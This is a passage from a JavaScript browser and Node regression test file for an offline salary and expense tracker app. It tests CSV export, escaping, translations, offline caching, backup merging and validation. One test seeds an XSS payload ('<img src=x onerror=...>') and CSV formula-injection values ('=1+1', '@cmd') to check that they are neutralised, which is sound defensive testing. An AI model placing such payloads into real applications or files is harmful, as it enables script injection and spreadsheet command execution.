  await page.click('#expenseList [data-edit=expenses]'); await page.fill('[name=amount]', '15'); await page.click('#editForm button[type=submit]'); await page.waitForTimeout(200); eq((await data(page, 'expenses'))[0].amount, 15);
});
test('regression: CSV neutralises formula characters (exercised with real records); HTML in stored text is escaped', async ({ page, base }) => {
  await seed(page, base, { expenses: [{ id: 'x', date: day(1), category: '=1+1', amount: 1, note: '@cmd' }, { id: 'y', date: day(2), category: '<img src=x onerror=window.__x=1>', amount: 1, note: '<b>n</b>' }] }); await open(page, base);
  const csv = await download(page, '#csv'); assert(/"'=1\+1"/.test(csv) && /"'@cmd"/.test(csv), 'formula chars not neutralised'); eq(await page.evaluate(() => window.__x), undefined); eq((await page.$$('#expenseList img')).length, 0);
});
test('regression: 6 languages render without horizontal overflow at 390px; dark/light themes apply; no console errors', async ({ page, base }) => {
  const errs = []; page.on('pageerror', e => errs.push(e.message)); page.on('console', m => m.type() === 'error' && errs.push(m.text()));
  await seed(page, base, GOOD().stores); await open(page, base);
  for (const l of I.LANGS) { await page.selectOption('#language', l); await page.waitForTimeout(100); assert(!(await page.evaluate(() => document.documentElement.scrollWidth > innerWidth + 1)), 'overflow in ' + l); }
  await page.selectOption('#theme', 'dark'); eq(await page.getAttribute('html', 'data-theme'), 'dark'); await page.selectOption('#theme', 'light'); eq(await page.getAttribute('html', 'data-theme'), 'light'); eq(errs, []);
});
test('regression: offline reload works with data intact; service worker caches every file the app needs', async ({ ctx, page, base }) => {
  await seed(page, base, GOOD().stores); await open(page, base); await page.waitForFunction(() => navigator.serviceWorker.getRegistration().then(r => r && r.active)); await page.waitForTimeout(800);
  const cached = await page.evaluate(async () => { const names = await caches.keys(); const c = await caches.open(names.find(n => n.startsWith('mst-'))); return (await c.keys()).map(r => new URL(r.url).pathname.split('/').pop() || './'); });
  for (const f of ['index.html', 'app.js', 'calc.js', 'i18n.js', 'style.css', 'manifest.json', 'recover.html']) assert(cached.includes(f), f + ' is not cached');
  if (hasRules) assert(cached.includes('backup-rules.js'), 'backup-rules.js not cached'); if (fs.existsSync(path.join(APP, 'recover.js'))) assert(cached.includes('recover.js'), 'recover.js not cached');
  await ctx.setOffline(true); await reload(page); eq((await data(page, 'work')).length, 1); await page.goto(base + '/recover.html'); await page.waitForSelector('#actions:not([hidden])', { timeout: 8000 }); await ctx.setOffline(false);
});
test('regression: manifest + icons are valid and every icon file exists with its stated size', async () => {
  const m = JSON.parse(fs.readFileSync(path.join(APP, 'manifest.json'), 'utf8')); assert(m.display === 'standalone' && m.start_url && m.scope);
  for (const ic of m.icons) { const f = path.join(APP, ic.src); assert(fs.existsSync(f), ic.src + ' missing'); const b = fs.readFileSync(f), w = b.readUInt32BE(16), h = b.readUInt32BE(20); eq(w + 'x' + h, ic.sizes, ic.src); }
  assert(fs.existsSync(path.join(APP, 'apple-touch-icon.png')));
}, { node: true });


/* ====================== rules module edge cases (Node) ====================== */
if (hasRules) {
  const RU = require(path.join(APP, 'backup-rules.js'));
  const wk = (id, date, hours) => ({ id, date, status: 'worked', hours: hours || 8 });
  test('rules/planMerge: same date + different id skipped; same id same date updated; free dates added', async () => {
    const r = RU.planMerge({ work: [wk('a', '2026-01-01', 9), wk('b', '2026-01-02'), wk('c', '2026-01-03')] }, [wk('a', '2026-01-01'), wk('z', '2026-01-02')]);
    eq(r.payload.work.map(x => x.id), ['a', 'c']); eq(r.skipped, 1); eq(r.skippedItems, [{ id: 'b', date: '2026-01-02' }]); eq(r.payload.work[0].hours, 9);
  }, { node: true });
  test('rules/planMerge: an update that would MOVE a record onto another record\'s date is skipped; a move to a free date is allowed and frees the old date', async () => {
    const cur = [wk('a', '2026-01-01'), wk('b', '2026-01-02')];
    eq(RU.planMerge({ work: [wk('a', '2026-01-02')] }, cur).skipped, 1);
    const r = RU.planMerge({ work: [wk('a', '2026-01-05'), wk('n', '2026-01-01')] }, cur); eq(r.skipped, 0); eq(r.payload.work.map(x => x.id), ['a', 'n']);
  }, { node: true });
  test('rules/planMerge: number 5 and text "5" are different ids (same as IndexedDB); existing duplicate dates never crash the merge and are never made worse', async () => {
    eq(RU.planMerge({ work: [wk('5', '2026-01-01')] }, [wk(5, '2026-01-01')]).skipped, 1);
    const r = RU.planMerge({ work: [wk('q', '2026-02-01'), wk('new', '2026-02-02')] }, [wk('a', '2026-02-01'), wk('b', '2026-02-01')]); eq(r.payload.work.map(x => x.id), ['new']);
    eq(RU.planMerge({ work: [] }, []).payload.work, []); eq(RU.planMerge(null, null).skipped, 0);
  }, { node: true });
  test('rules/validate: reports dates that already have 2+ work records inside the file (warning, not rejection); null/empty settings are dropped, never turned into 0', async () => {
    const v = RU.validateBackup({ stores: { work: [wk('a', '2026-01-01'), wk('b', '2026-01-01'), wk('c', '2026-01-02')] }, settings: { basic: null, bus: '', otRate: 3, language: 'el' } });
    assert(v.ok); eq(v.warnings.dupDates, 1); eq('basic' in v.rawSettings, false); eq('bus' in v.rawSettings, false); eq(v.rawSettings.otRate, 3);
  }, { node: true });
  test('rules/validate: error object names the store, the record number and a translation key', async () => {
    const v = RU.validateBackup({ stores: { work: [wk('a', '2026-01-01')], expenses: [{ id: 'x', date: '2026-01-01', amount: 1 }, { id: 'y', date: '2026-01-02', amount: -3 }] } });
    eq(v.ok, false); eq(v.err, { key: 'v_bad_amount', store: 'expenses', n: 2, field: 'amount' });
    eq(RU.validateBackup({ stores: { remittances: [{ id: 'r', date: '2026-01-01', amount: 5, rate: 0 }] } }).err.key, 'v_bad_rate');
    eq(RU.validateBackup({ stores: { payments: [{ id: 'p', date: '2026-01-01', month: '2026-01', amount: 5, bus: 9 }] } }).err.key, 'v_bad_bus');
  }, { node: true });
  test('rules/backupStatus: reminder thresholds (7 days), snooze, empty app, never, clock set backwards', async () => {
    const now = new Date('2026-06-15T12:00:00'), ago = d => new Date(now.getTime() - d * 864e5), st = o => RU.backupStatus(Object.assign({ hasRecords: true, now, today: '2026-06-15', snooze: '' }, o));
    eq(st({ last: ago(6.9) }).show, false); eq(st({ last: ago(7) }).show, true); eq(st({ last: ago(30) }).show, true); eq(st({ last: null }).never, true); eq(st({ last: new Date('x') }).never, true);
    eq(st({ last: null, hasRecords: false }).show, false); eq(st({ last: null, snooze: '2026-06-15' }).show, false); eq(st({ last: null, snooze: '2026-06-14' }).show, true);
    eq(st({ last: new Date(now.getTime() + 5 * 864e5) }).show, false);
  }, { node: true });
}
test('backup: reads the database fresh, so records written by ANOTHER window/tab are never missing from a backup', async ({ page, base }) => {
  await seed(page, base, { expenses: [{ id: 'a', date: day(1), category: 'food', amount: 1 }] }); await open(page, base);
  await page.evaluate(async () => { await new Promise((res, rej) => { const r = indexedDB.open('salary-tracker-db'); r.onsuccess = () => { const d = r.result, tx = d.transaction('expenses', 'readwrite'); tx.objectStore('expenses').put({ id: 'from-other-window', date: new Date().toISOString().slice(0, 8) + '02', category: 'food', amount: 2 }); tx.oncomplete = () => { d.close(); res(); }; tx.onerror = () => rej(tx.error); }; }); });
  const j = JSON.parse(await download(page, '#backup')); eq(j.stores.expenses.map(x => x.id).sort(), ['a', 'from-other-window']);
});

/* ====================== runner ====================== */
(async () => {
  const srv = await H.serve(APP); const browser = await chromium.launch(); let pass = 0, fail = 0; const failed = [];
  for (const t of tests) {
    if (FILTER && !t.name.includes(FILTER)) continue;
    const t0 = Date.now(); let ctx = null;
    try {
      if (t.opts.node) await t.fn({});
      else {
        ctx = await browser.newContext({ viewport: { width: 390, height: 844 }, acceptDownloads: true }); const page = await ctx.newPage(); page.setDefaultTimeout(8000);
        await Promise.race([t.fn({ ctx, page, base: srv.base, srv }), new Promise((_, rj) => setTimeout(() => rj(new Error('test timed out (45 s)')), 45000))]);
      }
      pass++; console.log('PASS  ' + t.name);
    } catch (e) { fail++; failed.push(t.name); console.log('FAIL  ' + t.name + '\n        -> ' + String(e.message).split('\n')[0].slice(0, 300)); }
    finally { if (ctx) await ctx.close().catch(() => { }); }
  }
  await browser.close(); srv.server.close();
  console.log('\n' + (fail ? 'RESULT: ' + fail + ' FAILED, ' : 'RESULT: ALL PASSED, ') + pass + ' passed, ' + (pass + fail) + ' run  [' + APP + ']'); process.exit(fail ? 1 : 0);
})();
